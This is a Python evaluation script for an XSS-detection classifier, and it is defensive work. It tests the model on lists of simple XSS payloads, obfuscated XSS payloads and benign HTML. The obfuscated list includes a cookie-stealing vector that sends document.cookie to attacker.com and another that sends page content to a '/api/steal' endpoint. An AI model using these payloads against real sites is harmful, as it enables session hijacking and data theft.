"""
Comprehensive XSS Test Script
- Tests model with normal and complex XSS payloads
- Tracks and reports misclassifications in detail
"""

from pathlib import Path
import json
from collections import defaultdict

import numpy as np
import torch
from sklearn.metrics import (
    classification_report,
    confusion_matrix,
    f1_score,
)
from torch.utils.data import DataLoader

from classifier import XSSClassifier
from preprocessing import CharTokenizer, XSSDataset


BASE_DIR = Path(__file__).parent
SAVE_DIR = BASE_DIR / "saved_models"
BATCH_SIZE = 128
DEVICE = "cuda" if torch.cuda.is_available() else "mps" if torch.backends.mps.is_available() else "cpu"

# Normal XSS Payloads (Simple, common attacks)
NORMAL_XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe onload=alert(1)>",
    "<img src=1 onerror=alert(1)>",
    "<img src=x onerror='alert(1)'>",
    "<svg/onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<body onmouseover=alert(1)>",
]

# Complex XSS Payloads (Obfuscated, advanced vectors)
COMPLEX_XSS_PAYLOADS = [
    # Encoded/obfuscated
    "<img src=x onerror=\"eval(atob('YWxlcnQoMSk='))\">",
    "<svg><script>alert(String.fromCharCode(88,83,83))</script></svg>",
    
    # Polyglot/context-breaking
    "';alert(String.fromCharCode(88,83,83));//",
    "'\"><script>alert(1)</script>",
    "</title><script>alert(1)</script>",
    
    # DOM-based / less obvious
    "<input onfocus=alert(1) autofocus>",
    "<select onfocus=alert(1) autofocus>",
    "<textarea onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>",
    "<div style=\"background:url(javascript:alert(1))\">",
    
    # Attribute-based
    "<img src='x' alt='y' title='' onclick=alert(1)>",
    "<a href='javascript:alert(1)'>click</a>",
    
    # Animation/event-based
    "<style>@keyframes x{}</style><div style='animation:x' onanimationstart=alert(1)></div>",
    "<marquee loop=1 width=0 onfinish=alert(1)>",
    
    # Data URI schemes
    "<embed src=data:text/html,<script>alert(1)</script>>",
    
    # SVG-based vectors
    "<svg><animate onload=alert(1)></animate></svg>",
    "<svg><set attributeName=x to=y onload=alert(1)></set></svg>",
    
    # Form-based
    "<form action=javascript:alert(1)><input type=submit>",
    
    # Meta/embed-based
    "<meta http-equiv=refresh content=0;url=javascript:alert(1)>",
    "<object data=javascript:alert(1)>",
    
    # IE-specific
    "<img src=x style='width:expression(alert(1))'>",
    
    # Additional complex vectors
    "<svg onload='fetch(\"http://attacker.com?c=\"+document.cookie)'>",
    "<img src=x onerror=\"fetch('/api/steal?data='+btoa(document.body.innerHTML))\">",
    "<iframe srcdoc=\"<script>alert(1)</script>\">",
    "<details open ontoggle=alert(1)>",
    "<video src=x onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<source src=x onerror=alert(1)>",
    "<track src=x onerror=alert(1)>",
    "<picture><img src=x onerror=alert(1)></picture>",
    "<script>eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))</script>",
    "<img src=x onerror=\"constructor.prototype.innerHTML='<script>alert(1)</script>'\">",
    "<svg><use href=\"data:image/svg+xml,<svg onload=alert(1)>\"></use></svg>",
    "<math><mtext xlink:href=x onerror=alert(1)></mtext></math>",
    "<img src=x alt='test' title='' onload=alert(1)>",
    "<div onmousemove=alert(1)>hover me</div>",
    "<body onpagehide=alert(1)>",
    "<body onpageshow=alert(1)>",
]

# Benign examples (Should NOT be flagged as XSS)
BENIGN_EXAMPLES = [
    "<div>Welcome to our website</div>",
    "<p>This is a paragraph with <strong>bold</strong> text</p>",
    "<a href='https://example.com'>Click here</a>",
    "<img src='image.jpg' alt='Description'>",
    "<ul><li>Item 1</li><li>Item 2</li></ul>",
    "<div class='container' id='main'>Content</div>",
    "<span style='color:red;'>Red text</span>",
    "<table><tr><td>Data</td></tr></table>",
    "<form method='post' action='/submit'><input type='text' name='email'></form>",
    "<button onclick='someValidFunction()'>Click</button>",
    "&lt;div&gt; &amp; stuff",
    "Email: user@example.com",
    "<a href='#top'>Back to top</a>",
    
    # Additional benign examples
    "<h1>Welcome</h1>",
    "<h2>Section Title</h2>",
    "<h3>Subsection</h3>",
    "<h4>Minor Heading</h4>",
    "<h5>Small Heading</h5>",
    "<h6>Smallest Heading</h6>",
    "<p>A paragraph of text content</p>",
    "<pre>Code block content</pre>",
    "<blockquote>A quote from someone</blockquote>",
    "<code>Some code here</code>",
    "<kbd>Ctrl+C</kbd>",
    "<samp>Sample output</samp>",
    "<var>variable_name</var>",
    "<mark>highlighted text</mark>",
    "<small>small text</small>",
    "<del>deleted text</del>",
    "<ins>inserted text</ins>",
    "<sub>subscript</sub>",
    "<sup>superscript</sup>",
    "<q>Short quote</q>",
    "<cite>Citation</cite>",
    "<dfn>Definition</dfn>",
    "<abbr title='Application Programming Interface'>API</abbr>",
    "<address>123 Main St, City, Country</address>",
    "<time>2024-05-08</time>",
    "<data value='42'>The answer</data>",
    
    # Lists
    "<ol><li>First</li><li>Second</li><li>Third</li></ol>",
    "<dl><dt>Term</dt><dd>Definition</dd></dl>",
    
    # Tables with content
    "<table><thead><tr><th>Header 1</th><th>Header 2</th></tr></thead><tbody><tr><td>Cell 1</td><td>Cell 2</td></tr></tbody></table>",
    "<table><caption>Table Title</caption></table>",
    
    # Form elements
    "<input type='text' placeholder='Enter text'>",
    "<input type='email' name='email'>",
    "<input type='password' name='password'>",
    "<input type='number' min='0' max='100'>",
    "<input type='date'>",
    "<input type='checkbox'>",
    "<input type='radio'>",
    "<textarea placeholder='Enter message'></textarea>",
    "<select><option>Option 1</option><option>Option 2</option></select>",
    "<label for='input1'>Label</label>",
    
    # Media elements
    "<img src='photo.jpg' alt='Photo'>",
    "<img src='icon.png' width='100' height='100'>",
    "<svg width='100' height='100'><rect width='100' height='100' fill='blue'/></svg>",
    "<canvas id='myCanvas' width='200' height='200'></canvas>",
    
    # Navigation and layout
    "<nav><a href='/'>Home</a><a href='/about'>About</a></nav>",
    "<header>Site Header</header>",
    "<footer>Site Footer</footer>",
    "<main>Main Content</main>",
    "<article>Article content</article>",
    "<section>Section content</section>",
    "<aside>Sidebar content</aside>",
    
    # Other safe HTML
    "<hr>",
    "<br>",
    "<wbr>",
    "<noscript>JavaScript is disabled</noscript>",
    "<em>emphasized text</em>",
    "<i>italic text</i>",
    "<b>bold text</b>",
    "<u>underlined text</u>",
    "<s>strikethrough</s>",
    "<figure><img src='image.jpg'><figcaption>Image caption</figcaption></figure>",
    "<meter value='6' min='0' max='10'></meter>",
    "<progress value='70' max='100'></progress>",
    "<details><summary>Click to expand</summary>Hidden content</details>",
    "<summary>Summary text</summary>",
    "<dialog>Dialog content</dialog>",
    
    # Text with special characters
    "Hello &amp; goodbye",
    "Price: &pound;100",
    "Copyright &copy; 2024",
    "Less than &lt; and greater than &gt;",
    "Quote: &quot;Hello&quot;",
    "Apostrophe: &#39;",
    
    # Complex but safe structures
    "<div class='wrapper'><header><h1>Title</h1></header><main><article><h2>Article</h2><p>Content</p></article></main><footer>Footer</footer></div>",
    "<form><fieldset><legend>Form Group</legend><input type='text'></fieldset></form>",
]


def load_model_and_tokenizer():
    """Load trained model and tokenizer."""
    print("\n[Loading] Model and tokenizer...")
    
    # Load tokenizer
    tok = CharTokenizer.load(str(SAVE_DIR / "tokenizer.json"))
    
    # Load hyperparameters
    try:
        with open(SAVE_DIR / "hparams.json") as f:
            hparams = json.load(f)
    except FileNotFoundError:
        hparams = {"embed_dim": 128, "num_filters": 64, "dropout": 0.5}
    
    # Load model
    model = XSSClassifier(
        tok.vocab_size,
        hparams.get("embed_dim", 128),
        hparams.get("num_filters", 64),
        hparams.get("dropout", 0.5),
    ).to(DEVICE)
    
    model.load_state_dict(torch.load(SAVE_DIR / "best_model.pt", map_location=DEVICE))
    model.eval()
    print(f"✓ Model loaded | Vocab size: {tok.vocab_size}")
    return model, tok


def evaluate_payloads(model, tokenizer, payloads, true_labels, category_name=""):
    """Evaluate model on payloads and return results."""
    dataset = XSSDataset(payloads, true_labels, tokenizer)
    loader = DataLoader(dataset, batch_size=BATCH_SIZE, shuffle=False)
    
    all_logits = []
    with torch.no_grad():
        for xb, _ in loader:
            xb = xb.to(DEVICE)
            all_logits.append(model(xb).cpu())
    
    logits = torch.cat(all_logits).numpy()
    probs = 1 / (1 + np.exp(-logits))  # Sigmoid
    
    return probs.flatten()


def analyze_results(payloads, true_labels, probs, threshold, category_name=""):
    """Analyze predictions and return misclassified samples."""
    preds = (probs >= threshold).astype(int)
    true_labels = np.array(true_labels)
    
    misclassified_indices = np.where(preds != true_labels)[0]
    correct = len(payloads) - len(misclassified_indices)
    
    misclassified = []
    for idx in misclassified_indices:
        misclassified.append({
            "text": payloads[idx],
            "true_label": int(true_labels[idx]),
            "pred_label": int(preds[idx]),
            "confidence": float(probs[idx]),
            "category": category_name,
            "error_type": "FP" if true_labels[idx] == 0 else "FN",
        })
    
    return correct, misclassified, preds


def print_results(category_name, correct, total, misclassified):
    """Print results for a category."""
    pct = 100 * correct / total
    status = "✓" if correct == total else "✗"
    print(f"\n{status} {category_name:20s}: {correct:2d}/{total:2d} correct ({pct:5.1f}%)", end="")
    if misclassified:
        print(f" - {len(misclassified)} misclassified")
    else:
        print()


def print_misclassification_details(all_misclassified):
    """Print detailed misclassification analysis."""
    if not all_misclassified:
        return
    
    print("\n" + "="*90)
    print("MISCLASSIFICATION DETAILS")
    print("="*90)
    
    # Group by error type
    false_positives = [m for m in all_misclassified if m["error_type"] == "FP"]
    false_negatives = [m for m in all_misclassified if m["error_type"] == "FN"]
    
    # False Positives
    if false_positives:
        print(f"\n❌ FALSE POSITIVES ({len(false_positives)} - Benign classified as XSS):")
        print("─" * 90)
        for i, m in enumerate(sorted(false_positives, key=lambda x: x["confidence"], reverse=True), 1):
            print(f"\n{i}. [{m['category']}] Confidence: {m['confidence']:.4f}")
            print(f"   {m['text']}")
    
    # False Negatives
    if false_negatives:
        print(f"\n❌ FALSE NEGATIVES ({len(false_negatives)} - XSS classified as Benign):")
        print("─" * 90)
        for i, m in enumerate(sorted(false_negatives, key=lambda x: x["confidence"]), 1):
            print(f"\n{i}. [{m['category']}] Confidence: {m['confidence']:.4f}")
            print(f"   {m['text']}")


def main():
    print("="*90)
    print("COMPREHENSIVE XSS DETECTION TEST")
    print("="*90)
    
    # Load model
    model, tokenizer = load_model_and_tokenizer()
    
    # Use threshold from saved results or default
    try:
        with open(SAVE_DIR / "test_results.json") as f:
            threshold = json.load(f).get("threshold", 0.5)
    except FileNotFoundError:
        threshold = 0.5
    
    print(f"Using threshold: {threshold:.4f}")
    
    # Test Normal XSS Payloads
    print("\n" + "─"*90)
    print("[Testing] Normal XSS Payloads")
    print("─"*90)
    
    probs_normal = evaluate_payloads(model, tokenizer, NORMAL_XSS_PAYLOADS, [1]*len(NORMAL_XSS_PAYLOADS))
    correct_normal, misclass_normal, _ = analyze_results(
        NORMAL_XSS_PAYLOADS, [1]*len(NORMAL_XSS_PAYLOADS), probs_normal, threshold, "Normal XSS"
    )
    print_results("Normal XSS", correct_normal, len(NORMAL_XSS_PAYLOADS), misclass_normal)
    
    # Test Complex XSS Payloads
    print("\n" + "─"*90)
    print("[Testing] Complex XSS Payloads")
    print("─"*90)
    
    probs_complex = evaluate_payloads(model, tokenizer, COMPLEX_XSS_PAYLOADS, [1]*len(COMPLEX_XSS_PAYLOADS))
    correct_complex, misclass_complex, _ = analyze_results(
        COMPLEX_XSS_PAYLOADS, [1]*len(COMPLEX_XSS_PAYLOADS), probs_complex, threshold, "Complex XSS"
    )
    print_results("Complex XSS", correct_complex, len(COMPLEX_XSS_PAYLOADS), misclass_complex)
    
    # Test Benign Examples
    print("\n" + "─"*90)
    print("[Testing] Benign Examples")
    print("─"*90)
    
    probs_benign = evaluate_payloads(model, tokenizer, BENIGN_EXAMPLES, [0]*len(BENIGN_EXAMPLES))
    correct_benign, misclass_benign, _ = analyze_results(
        BENIGN_EXAMPLES, [0]*len(BENIGN_EXAMPLES), probs_benign, threshold, "Benign"
    )
    print_results("Benign", correct_benign, len(BENIGN_EXAMPLES), misclass_benign)
    
    # Summary
    print("\n" + "="*90)
    print("SUMMARY")
    print("="*90)
    
    total_tested = len(NORMAL_XSS_PAYLOADS) + len(COMPLEX_XSS_PAYLOADS) + len(BENIGN_EXAMPLES)
    total_correct = correct_normal + correct_complex + correct_benign
    total_misclass = len(misclass_normal) + len(misclass_complex) + len(misclass_benign)
    
    print(f"\nTotal Payloads Tested: {total_tested}")
    print(f"  ├─ Normal XSS:   {len(NORMAL_XSS_PAYLOADS)}")
    print(f"  ├─ Complex XSS:  {len(COMPLEX_XSS_PAYLOADS)}")
    print(f"  └─ Benign:       {len(BENIGN_EXAMPLES)}")
    
    print(f"\nCorrect: {total_correct}/{total_tested} ({100*total_correct/total_tested:.1f}%)")
    print(f"Misclassified: {total_misclass}")
    
    if total_misclass > 0:
        fp_count = len([m for m in misclass_normal + misclass_complex + misclass_benign if m["error_type"] == "FP"])
        fn_count = len([m for m in misclass_normal + misclass_complex + misclass_benign if m["error_type"] == "FN"])
        print(f"  ├─ False Positives (Benign → XSS): {fp_count}")
        print(f"  └─ False Negatives (XSS → Benign): {fn_count}")
    
    # Detailed misclassifications
    all_misclass = misclass_normal + misclass_complex + misclass_benign
    print_misclassification_details(all_misclass)
    
    # Save detailed results
    results = {
        "threshold": float(threshold),
        "summary": {
            "total_tested": int(total_tested),
            "correct": int(total_correct),
            "accuracy": float(total_correct / total_tested),
            "misclassified": int(total_misclass),
        },
        "by_category": {
            "normal_xss": {"correct": int(correct_normal), "total": len(NORMAL_XSS_PAYLOADS), "misclassified": len(misclass_normal)},
            "complex_xss": {"correct": int(correct_complex), "total": len(COMPLEX_XSS_PAYLOADS), "misclassified": len(misclass_complex)},
            "benign": {"correct": int(correct_benign), "total": len(BENIGN_EXAMPLES), "misclassified": len(misclass_benign)},
        },
        "misclassified_samples": all_misclass,
    }
    
    with open(SAVE_DIR / "payload_test_results.json", "w") as f:
        json.dump(results, f, indent=2)
    
    print(f"\n✓ Results saved to {SAVE_DIR / 'payload_test_results.json'}")
    print("="*90)


if __name__ == "__main__":
    main()
